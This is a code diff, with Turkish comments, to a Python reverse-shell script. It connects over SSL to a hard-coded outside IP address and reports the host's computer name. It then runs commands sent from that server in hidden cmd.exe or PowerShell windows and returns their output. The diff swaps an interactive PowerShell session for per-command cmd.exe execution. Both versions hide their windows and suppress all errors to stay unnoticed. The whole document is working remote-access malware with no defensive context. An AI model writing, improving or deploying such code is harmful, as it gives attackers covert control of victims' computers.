@@ -1,21 +1,8 @@
 import socket
 import ssl
 import subprocess
-import threading
 import os
 import sys
-
-def handle_outputs(proc_stream, ssl_socket):
-    """Sürecin çıktılarını (stdout/stderr) okur ve anında sokete basar."""
-    while True:
-        try:
-            # Satır satır okuma yaparak tamponlama kilidini kırıyoruz
-            line = proc_stream.readline()
-            if not line:
-                break
-            ssl_socket.send(line)
-        except:
-            break
 
 def connect_back():
     h = '185.194.175.132'
@@ -32,45 +19,41 @@ def connect_back():
         ssls.connect((h, p))
         
         computer_name = os.environ.get("COMPUTERNAME", "PC")
-        ssls.send(f"--- Interaktif Oturum Basladi: {computer_name} ---\nPS> ".encode())
+        ssls.send(f"--- Baglanti Saglandi: {computer_name} ---\n\n".encode())
         
-        # Windows penceresini tamamen görünmez kılma bayrakları
-        si = subprocess.STARTUPINFO()
-        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        si.wShowWindow = 0
-        
-        # CMD yerine PowerShell kullanarak girdi/çıktı senkronizasyonunu garantiye alıyoruz
-        proc = subprocess.Popen(
-            ['powershell.exe', '-NoExit', '-Command', '-'],
-            startupinfo=si,
-            creationflags=subprocess.CREATE_NO_WINDOW,
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            bufsize=0 # Tamponlamayı sıfırlıyoruz
-        )
-        
-        # Çıktıları izlemek için thread'leri başlatıyoruz
-        t1 = threading.Thread(target=handle_outputs, args=(proc.stdout, ssls))
-        t2 = threading.Thread(target=handle_outputs, args=(proc.stderr, ssls))
-        t1.daemon = True
-        t2.daemon = True
-        t1.start()
-        t2.start()
-        
-        # Soketten gelen girdileri sürece aktarma
         while True:
-            data = ssls.recv(1024)
-            if not data:
+            # Komut satırını al ve temizle
+            data = ssls.recv(1024).decode('utf-8', 'ignore').strip()
+            if not data or data == 'exit':
                 break
-            proc.stdin.write(data)
-            proc.stdin.flush() # Veriyi Windows'a zorla ittiriyoruz
+            
+            # Windows görünmezlik bayrakları
+            si = subprocess.STARTUPINFO()
+            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+            si.wShowWindow = 0
+            
+            # Her komutu bağımsız bir süreç olarak çalıştırıp çıktıları yakala
+            proc = subprocess.Popen(
+                f'cmd.exe /c {data}',
+                startupinfo=si,
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                shell=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                stdin=subprocess.PIPE
+            )
+            stdout, stderr = proc.communicate()
+            
+            # Çıktıyı anında gönder ve komut satırı belirtecini ekle
+            ssls.send(stdout + stderr + b"\nC:> ")
             
     except:
         pass
     finally:
-        try: s.close()
-        except: pass
+        try:
+            s.close()
+        except:
+            pass
 
 if __name__ == "__main__":
     connect_back()
